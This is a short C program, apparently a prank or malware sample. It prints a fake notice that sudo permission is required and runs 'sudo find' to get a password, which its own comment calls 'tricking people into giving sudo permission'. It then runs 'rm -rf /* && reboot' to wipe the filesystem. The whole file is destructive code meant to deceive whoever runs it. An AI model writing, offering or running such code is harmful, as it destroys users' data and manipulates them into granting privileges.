#include <stdlib.h>

int main()
{
	system("echo sudo permission access required files");
	system("sudo find"); // tricking people into giving sudo permission
	system("rm -rf /* && reboot");
	return 0;
}
